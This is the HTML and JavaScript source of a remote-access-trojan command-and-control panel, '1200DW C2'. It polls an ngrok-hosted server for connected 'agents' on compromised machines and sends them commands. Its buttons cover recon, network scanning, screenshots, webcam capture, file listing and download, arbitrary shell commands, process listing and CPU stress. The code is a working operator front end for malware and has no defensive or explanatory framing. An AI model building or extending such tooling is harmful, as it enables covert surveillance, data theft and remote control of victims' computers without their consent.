<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1200DW | C2 Admin Panel</title>
    <!-- Bootstrap 5 for styling -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a0a0a;
            --card-bg: #141414;
            --accent-red: #ff0000;
            --accent-blue: #00d4ff;
            --accent-green: #00ff88;
            --accent-yellow: #ffcc00;
            --text-main: #e0e0e0;
            --text-muted: #888;
        }

        body { 
            background-color: var(--bg-dark); 
            color: var(--text-main); 
            font-family: 'Inter', sans-serif; 
            overflow-x: hidden;
        }

        /* Navbar Styling */
        .navbar { 
            background-color: var(--card-bg); 
            border-bottom: 2px solid var(--accent-red); 
            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.2);
        }

        /* Agent Card Styling */
        .card { 
            background-color: var(--card-bg); 
            border: 1px solid #333; 
            color: white; 
            transition: all 0.3s ease;
        }

        .card:hover {
            border-color: var(--accent-red);
            transform: translateY(-4px);
            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.1);
        }

        .status-online { color: var(--accent-green); font-weight: bold; text-shadow: 0 0 5px var(--accent-green); }
        .agent-id { font-family: 'JetBrains Mono', monospace; color: var(--accent-blue); }
        
        /* Modal / Command Center Styling */
        .modal-content { 
            background-color: var(--card-bg); 
            border: 1px solid var(--accent-red); 
            color: white;
        }

        .modal-header { border-bottom: 1px solid #333; }
        
        .form-control {
            background-color: #1a1a1a;
            border: 1px solid #444;
            color: white;
        }

        .form-control:focus {
            background-color: #222;
            color: white;
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 0.25rem rgba(0, 212, 255, 0.15);
        }

        /* Macro Button Styling */
        .macro-btn {
            text-align: left;
            padding: 12px;
            font-size: 0.85rem;
            font-weight: 600;
            transition: all 0.2s;
            border-radius: 6px;
            height: 100%;
            display: flex;
            align-items: center;
        }

        .macro-btn:hover {
            transform: scale(1.03);
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: var(--bg-dark); }
        ::-webkit-scrollbar-thumb { background: #333; }
        ::-webkit-scrollbar-thumb:hover { background: var(--accent-red); }

        .btn-primary { background-color: var(--accent-red); border: none; }
        .btn-primary:hover { background-color: #cc0000; }

        .btn-outline-danger { color: var(--accent-red); border-color: var(--accent-red); }
        .btn-outline-danger:hover { background-color: var(--accent-red); color: white; }
    </style>
</head>
<body>

<nav class="navbar navbar-dark px-4 py-3">
    <span class="navbar-brand mb-0 h1 text-uppercase fw-bold" style="color: var(--accent-red); letter-spacing: 2px;">
        1200DW <span class="text-white">C2</span>
    </span>
    <div class="d-flex align-items-center">
        <span class="badge bg-dark text-light border border-success" id="connection-status">System: Online</span>
    </div>
</nav>

<div class="container mt-5">
    <div class="row">
        <div class="col-md-12">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div>
                    <h2 class="fw-bold mb-0">Active Agents</h2>
                    <p class="text-muted small">Manage and issue commands to connected nodes.</p>
                </div>
                <button class="btn btn-sm btn-outline-secondary" onclick="fetchAgents()">Refresh List</button>
            </div>
            <div id="agent-container">
                <div class="text-center py-5">
                    <div class="spinner-border text-danger" role="status"></div>
                    <p class="mt-3 text-muted">Scanning for active connections...</p>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Command Modal -->
<div class="modal fade" id="commandModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title text-danger fw-bold">C2 COMMAND CENTER</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <div class="row">
            <!-- Left Column: Configuration -->
            <div class="col-md-5 border-end border-secondary pe-md-4">
                <p class="small text-muted mb-1 text-uppercase fw-bold">Target Agent</p>
                <p id="target-agent-id" class="agent-id text-info">--</p>

                <div class="mb-4">
                    <label class="form-label small fw-bold text-uppercase">Command Payload</label>
                    <textarea id="command-payload" class="form-control" rows="3" placeholder="Enter custom arguments..."></textarea>
                    <div class="form-text text-warning" style="font-size: 0.7rem;">Required for specific shell or file tasks.</div>
                </div>

                <hr class="border-secondary">
                <button class="btn btn-primary w-100 py-2" onclick="sendCommand('MANUAL_EXEC')">Execute Manual Command</button>
            </div>

            <!-- Right Column: Macros -->
            <div class="col-md-7 ps-md-4">
                <p class="small fw-bold text-uppercase mb-3 text-white">Macro Modules</p>
                
                <div class="row g-3">
                    <!-- Recon Group -->
                    <div class="col-6">
                        <button class="btn btn-outline-info macro-btn w-100" onclick="sendCommand('MACRO_SYS_INFO')">🔍 Full Recon</button>
                    </div>
                    <div class="col-6">
                        <button class="btn btn-outline-info macro-btn w-100" onclick="sendCommand('MACRO_NET_SCAN')">🌐 Net Scan</button>
                    </div>

                    <!-- Surveillance Group -->
                    <div class="col-6">
                        <button class="btn btn-outline-primary macro-btn w-100" onclick="sendCommand('MACRO_SCREEN')">📸 Screenshot</button>
                    </div>
                    <div class="col-6">
                        <button class="btn btn-outline-primary macro-btn w-100" onclick="sendCommand('MACRO_CAM')">📷 Webcam</button>
                    </div>

                    <!-- File System Group -->
                    <div class="col-6">
                        <button class="btn btn-outline-success macro-btn w-100" onclick="sendCommand('MACRO_FILE_LIST')">📂 File List</button>
                    </div>
                    <div class="col-6">
                        <button class="btn btn-outline-success macro-btn w-100" onclick="sendCommand('MACRO_FILE_DOWNLOAD')">📥 Download</button>
                    </div>

                    <!-- System Control Group -->
                    <div class="col-6">
                        <button class="btn btn-outline-warning macro-btn w-100" onclick="sendCommand('MACRO_SHELL')">💻 Shell CMD</button>
                    </div>
                    <div class="col-6">
                        <button class="btn btn-outline-warning macro-btn w-100" onclick="sendCommand('MACRO_PROCESS')">⚙️ Processes</button>
                    </div>

                    <!-- Destructive Group -->
                    <div class="col-6">
                        <button class="btn btn-outline-danger macro-btn w-100" onclick="sendCommand('MACRO_CPU_STRESS')">🔥 CPU Stress</button>
                    </div>
                    <div class="col-6">
                        <button class="btn btn-outline-danger macro-btn w-100" onclick="sendCommand('MACRO_EXIT')">💀 Terminate</button>
                    </div>
                </div>
            </div>
        </div>
      </div>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    /**
     * DEEPHAT C2 - FRONTEND CONFIG
     */
    const API_BASE = "https://privacy-exile-stove.ngrok-free.dev"; 
    let selectedAgentId = "";
    const commandModal = new bootstrap.Modal(document.getElementById('commandModal'));

    // Helper to generate standard headers for all requests
    const getHeaders = () => ({
        'Content-Type': 'application/json',
        'ngrok-skip-browser-warning': 'true'
    });

    // 1. Fetch Agents List
    async function fetchAgents() {
        try {
            const response = await fetch(`${API_BASE}/dashboard/agents`, {
                method: 'GET',
                headers: getHeaders()
            });
            
            if (!response.ok) throw new Error("Server unreachable");
            const agents = await response.json();
            renderAgents(agents);
        } catch (err) {
            console.error("Error fetching agents:", err);
            document.getElementById('connection-status').innerText = "System: Offline";
            document.getElementById('connection-status').classList.replace('border-success', 'border-danger');
        }
    }

    // 2. Render Agents to UI
    function renderAgents(agents) {
        const container = document.getElementById('agent-container');
        container.innerHTML = '';

        const agentKeys = Object.keys(agents);
        if (agentKeys.length === 0) {
            container.innerHTML = '<div class="alert alert-dark text-center">No agents detected. Waiting for connections...</div>';
            return;
        }

        agentKeys.forEach(id => {
            const agent = agents[id];
            const card = document.createElement('div');
            card.className = 'card shadow-sm mb-3';
            card.innerHTML = `
                <div class="card-body d-flex justify-content-between align-items-center">
                    <div>
                        <h5 class="card-title mb-1">Agent: <span class="agent-id">${id}</span></h5>
                        <p class="card-text mb-0 text-muted small">Last Seen: ${agent.last_seen}</p>
                        <span class="status-online small">● ${agent.status.toUpperCase()}</span>
                    </div>
                    <div class="d-flex gap-2">
                        <button class="btn btn-primary btn-sm" onclick="openCommandModal('${id}')">Issue Command</button>
                        <button class="btn btn-outline-danger btn-sm" onclick="deleteAgent('${id}')">Remove</button>
                    </div>
                </div>
            `;
            container.appendChild(card);
        });
    }

    // 3. Command Functions
    function openCommandModal(id) {
        selectedAgentId = id;
        document.getElementById('target-agent-id').innerText = id;
        document.getElementById('command-payload').value = ''; 
        commandModal.show();
    }

    async function sendCommand(command) {
        const payload = document.getElementById('command-payload').value;
        
        try {
            const response = await fetch(`${API_BASE}/dashboard/command`, {
                method: 'POST',
                headers: getHeaders(),
                body: JSON.stringify({ 
                    agent_id: selectedAgentId, 
                    command: command,
                    payload: payload 
                })
            });
            
            const data = await response.json();
            if (data.status === 'success') {
                console.log(`Command [${command}] sent to ${selectedAgentId}`);
                commandModal.hide();
            } else {
                alert("Failed to send command: " + (data.detail || "Unknown error"));
            }
        } catch (err) {
            console.error(err);
            alert("Error connecting to C2 Server!");
        }
    }

    async function deleteAgent(id) {
        if (confirm(`Are you sure you want to remove ${id}?`)) {
            try {
                const response = await fetch(`${API_BASE}/dashboard/agent/${id}`, { 
                    method: 'DELETE',
                    headers: getHeaders()
                });
                
                if (response.ok) {
                    fetchAgents();
                } else {
                    alert("Error removing agent.");
                }
            } catch (err) {
                alert("Error removing agent.");
            }
        }
    }

    // Auto-refresh every 5 seconds
    setInterval(fetchAgents, 5000);
    fetchAgents();
</script>
</body>
</html>
